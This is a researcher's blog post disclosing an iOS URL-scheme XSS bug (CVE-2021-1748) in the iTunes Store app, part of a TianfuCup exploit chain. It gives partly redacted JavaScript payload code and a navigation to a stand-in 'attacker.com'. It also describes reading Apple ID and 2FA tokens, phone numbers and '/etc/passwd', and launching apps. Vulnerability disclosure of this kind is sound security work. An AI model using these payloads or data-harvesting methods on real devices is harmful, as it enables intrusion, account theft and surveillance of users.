---
layout:	post
title: "Mistuned Part 1: Client-side XSS to Calculator and More"
image: /img/2021-08-04-mistuned-part-i/mistune.png
---

Ever since Pointer Authentication Code (PAC) has been introduced, iPhone remained standing for more than two years on various pwn contests until TianfuCup 2020 (Project Zero has reported a remote zero click exploit in 2019). Ant Security and Qihoo 360 used two different bug chains respectively to successfully gained remote code execution with userspace sandbox escape on iPhone 11 with iOS 14.2.

In a series of post, I am going to disclouse the bugs I used for full-chain remote code execution. Born with Generation Z, these bugs were introduced by iOS 3 and iOS 6 respectively, however they were still able to fully bypass various protections on a state-of-the-art mobile phone at the time.

## Client-side XSS from iOS 3

The exploit starts from a malicious page in MobileSafari. Instead of attacking MobileSafari itself, there is a well-known attack surface named URL Schemes or Universal Links. It's the resource locator for Apps. Web pages can open local apps with a formatted URL. In MobileSafari, some built-in Apple apps are trusted unconditionally, including App Store and iTunes. There is no user confirmation before inter-app navigation.

Back to [Pwn2Own 2014](https://www.securityweek.com/mobile-pwn2own-2014-iphone-5s-galaxy-s5-nexus-5-fire-phone-hacked), Jung Hoon Lee used `itmss://` to open arbitrary untrusted website in iTunes, leading to sandbox escape. An additional memory corruption bug was used to gain code execution. It has been assigned to [CVE-2014-8840](https://support.apple.com/en-us/HT204245).

```js
<script>
location = 'itmss://attacker.com';
</script>
```

iOS then introduced a trusted domain list in this URL scheme. Before loading the page, it fetches a configuration from [this URL](https://sandbox.itunes.apple.com/WebObjects/MZInit.woa/wa/initiateSession). The configuration is an XML serialized property list. The hostname of the page must match the following suffix defined in `trustedDomains` field.

```xml
<key>trustedDomains</key>
<array>
  <string>.apple.com.edgesuite.net</string>
  <string>.asia.apple.com</string>
  <string>.corp.apple.com</string>
  <string>.euro.apple.com</string>
  <string>.itunes.apple.com</string>
  <string>.itunes.com</string>
  <string>.icloud.com</string>
```

If the domain matches, iTunes Store will render the page in its `SUWebView`, which is a subclass of the deprecated `UIWebView` in HTTPS. We can't Man-in-the-middle to hijack the HTML, but any XSS in the trusted domain can inject Javascript to this app.

However, after analyzing the following methods, I found another bypass introduced by iOS 3 to achieve client-side XSS.

* `-[SUStoreController handleApplicationURL:]`
* `-[NSURL storeURLType]`
* `-[SUStoreController _handleAccountURL:]`
* `-[SKUIURL initWithURL:]`

**This bug could affect a wide range of iOS versions. Part of the PoC is redacted to help protect users that stay below 14.3 due to hardware limitations or at their will.**

Given certain combination of parameters, this `itms` URL will force the app to ignore the hostname but load a secondary URL provided by the query string instead: `itms://<redacted>&url=http://www.apple.com`. While the hostname still has to match the trust list, it allows plain text http communications and some domains in the list like `support.mac.com` don't have HSTS, making them vulnerable to interception. Furthermore, according to the disassembly, it trusts arbitrary data URI in addition to the allowed host names: `itms://<redacted>&url=data:text/plain,hello`. This is basically a reflected XSS since it can carry arbitrary inline HTML. 

The app always appends a question mark after the URL, trying to append extra querstring. This breaks base64 encoding, but plain text works just fine. Here's an example of the inter app script inection.

```js
String.prototype.toDataURI = function() {
  return 'data:text/html;,' + encodeURIComponent(this).replace(/[!'()*]/g, escape);
}

function payload() {  
  iTunes.alert('gotcha'); // do ya thing
}

const data = `<script type="application/javascript">(${payload})()<\/script>`.toDataURI()
const url = new URL('itms://<redacted>');
// part of the PoC is redacted to prevent abuse
url.searchParams.set('url', data);
location = url
```

The earliest firmware that has the vulnerable code is `Kirkwood7A341`, which was released back to 2009.

`SUWebView` is a subclass of `UIWebView`, so it doesn't have isolated renderer processes. A common misunderstanding for WebView is that only `WKWebView` has JIT optimization. Actually it's controlled by the `dynamic-codesigning` entitlement. iTunes Store has this entitlement to speed up `JSContext` execution, but it happens to create an environment that any working exploit (nomatter the type, JIT or DOM) in MobileSafari works here as well, without concerning about the WebContent sandbox.

Due to the system enforcement, to use `mmap(MAP_JIT)`, the process must be sandboxed. So iTunes Store still has `app-container` after all, but it's got much more access compared to WebContent and even third-party apps. It has been granted even more entitlements for privacy related access like camera and AppStore credentials. It's probably the highest privilege that shellcode could get after `jsc` interpreter had been removed from iOS.

But everything comes with a price. In this context, the exploit has only one chance to get remote code execution, or the app dies. There is no such thing like auto recover for browser tabs. It has a high demand for reliability of the exploit. Besides, this bug redirects from MobileSafari to iTunes Store, leaving significantly observable animation in the UI, so it's not ideal for real attackers.

On iOS 14, iTunes Store is not the only vector. There is a StoreKitUIService app that suffers the same flaw. The only difference is the URL Scheme is `itms-ui`, rather than `itms`. StoreKitUIService is also responsible for delievering OTA enterprise apps. It has almost no UI impact compared to the former. Unfortunately `itms-ui` is not trusted. MobileSafari warns before opening the URL. However, if the payload is delivered through iMessage, AirDrop or some 3rd-party instant messengers, it doesn't matter because such scenarios don't require extra confirmation.

This bug has been assigned to CVE-2021-1748.

## Memory Corruption-free Exploitation

Before getting into the code execution, this client-side XSS is interesting because it allows reading sensitive information and arbitrary app execution.

The `UIWebView` uses obsolete `WebScripting` API to export extra methods to Javascript. `WebScripting` translates Javascript invocations to Objective-C, with known data types automatically converted. There is an `iTunes` namespace in `globalThis` context, which is bunded to an `SUScriptInterface` instance. It has interfaces as follows:

**Fingerprinting**. `iTunes.systemVersion()` and `userAgent` can tell the OS version and the model of SoC, which are useful for adjusting the exploit.

**Apple ID**. `iTunes.primaryAccount?.identifier` is the Apple ID for App Store and iTunes.`primaryiCloudAccount?.identifier` is the iCloud account. Besides, any outgoing http requests, no matter what the domain is, will have extra headers for Apple ID authentication. Even two-factor authentication (2FA) related tokens like `X-Apple-I-MD` and `X-Apple-I-MD-M` are included.

```js
{
  'icloud-dsid': '***',
  'x-apple-store-front': '143465-19,29',
  'x-dsid': '***',
  'x-apple-client-versions': 'iBooks/7.2; iTunesU/3.7.4; GameCenter/??; Podcasts/3.9',
  'x-mme-client-info': '<iPhone12,3> <iPhone OS;14.2;18B92> <com.apple.AppleAccount/1.0 (com.apple.MobileStore/1)>',
  'x-apple-i-timezone': 'GMT+8',
  'x-apple-i-client-time': '2020-11-06T14:46:07Z',
  'x-apple-i-md-rinfo': '17106176',
  'x-apple-adsid': '***',
  'x-apple-connection-type': 'WiFi',
  'x-apple-partner': 'origin.0',
  'x-apple-i-locale': 'zh_CN',
  'x-apple-i-md-m': '***',
  'x-apple-i-md': '***'
}
```

**Disk space**. `iTunes.diskSpaceAvailable()` tells the available disk space of the phone.

**Telephony**. `iTunes.telephony` is a namespace that gives the phone number, operator and provider of the victim. Imagine this, there is no need to ask the number for a person that attractives you in a party. Just AirDrop the bait and wait for response.

**Reading textual files (within the container)**. `SUScriptInterface` has a custom AJAX implementation that doesn't enforce same-origin policy. The only limit is that the hostname must match a certain trusted list (different from the former). The implementation is based on `NSURL` and it doesn't check for the scheme, so I can use file URLs to read a local path, where the hostname will be discarded: `file://r.mzstatic.com/etc/passwd`. Unfortunately the result is `NSString` backed so it doesn't support binary data. After all, this app has no direct access to the full disk because of the sandbox.

**Arbitrary app enumeration and execution**. `iTunes.installedSoftwareApplications` is an array for all the installed apps. It supports launching app by identifier, so here is how I managed to launch calculator from web without touching any modern memory safety mitigations:

```js
const app = iTunes.softwareApplicationWithBundleID_('com.apple.calculator')
app.launchWithURL_options_suspended_('calc://1337', {}, false);
```

![Calculator Demo](/img/2021-08-04-mistuned-part-i/calc.gif)

## Conclusion

CVE-2021-1748 is just anther fresh example of my previous BlackHat Talk [Cross-site Escape](https://i.blackhat.com/eu-20/Thursday/eu-20-Zhou-Cross-Site-Escape-Pwning-MacOS-Safari-Sandbox-The-Unusual-Way.pdf). A client side XSS disarms the sandbox and exposes a bigger attack surface by exposing extra methods to JavaScript. It doesn't even need memory corruption at this point to launch Calculator app.

In the upcoming posts, I'll introduce a secondary UAF bug (CVE-2021-1864) to gain various memory primitives, build arbitrary invocation, and finally bypass both PAC and APRR to load arbitrary shellcode in the context of iTunes Store app.
